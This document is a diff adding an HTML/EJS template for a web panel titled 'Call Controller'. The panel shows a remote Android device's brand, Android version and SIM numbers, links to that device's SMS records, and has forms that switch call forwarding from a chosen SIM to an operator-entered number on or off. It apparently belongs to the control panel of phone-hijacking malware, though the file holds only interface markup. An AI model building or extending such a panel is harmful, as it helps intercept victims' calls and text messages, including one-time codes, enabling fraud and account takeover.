@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Device Details</title>
+  <link rel="stylesheet" href="/css/final.css">
+</head>
+<body>
+  <!-- Header Navigation -->
+  <header class="header-nav">
+    <h1>Call Controller</h1>
+  </header>
+
+  <!-- Main Content Container -->
+  <div class="container">
+    <div class="device-details">
+      <div >
+        <h2>Device Information</h2>
+        <p><strong>Mobile:</strong> <%= device.brand %></p>
+        <p><strong>Android Version:</strong> <%= device.androidVersion %></p>
+      </div>
+      
+      <!-- Toggle Button -->
+      <a class="toggle-btn" href="#">Select SIM</a>
+      <div class="back-link">
+        <a class="View" href="/api/data/detail/<%= device._id %>">Device</a>
+        <a class="History" href="/api/notification/custom/sms/<%= device._id %>">SMS</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toggle Page for SIM Selection -->
+  <div class="toggle-page">
+    <div class="toggle-content">
+      <!-- SIM 1 Option -->
+      <label class="sim-option active">
+        <input type="radio" name="sim" value="SIM 1" checked>
+        <img src="/image/sim.png" alt="SIM 1" class="sim-icon">
+        <div class="sim-details">
+          <p><%= sim1Number %></p>
+        </div>
+       
+        <span id="1st" class="green-ball static"></span>
+      </label>  
+
+      <!-- SIM 2 Option -->
+      <label class="sim-option">
+        <input type="radio" name="sim" value="SIM 2">
+        <img src="/image/sim.png" alt="SIM 2" class="sim-icon">
+        <div class="sim-details">
+          <p><%= sim2Number %></p>
+        </div>
+        <!-- एक स्थिर ग्रीन बॉल -->
+        <span id="2nd" class="green-ball static"></span>
+      </label>
+
+      <div class="forward-section">
+        <h3>Forward To <span id="greenBall" class="green-ball"></span></h3>
+        <form id="startForm" method="POST" action="/api/device/admin/set/<%= device._id %>">
+          <input type="hidden" id="selectedSim" name="sim">
+          <input type="text" name="phoneNumber" placeholder="Your Number" required>
+          <button type="submit" class="btn active">ACTIVE</button>
+        </form>
+
+        <form id="stopForm" method="POST" action="/api/device/admin/stop/<%= device._id %>">
+          <input type="hidden" id="stopSelectedSim" name="sim">
+          <button type="submit" class="btn active">Deactive</button>
+        </form>
+      </div>
+    </div>
+  </div>
+  <script src="/js/cript.js"></script>
+</body>
+</html>
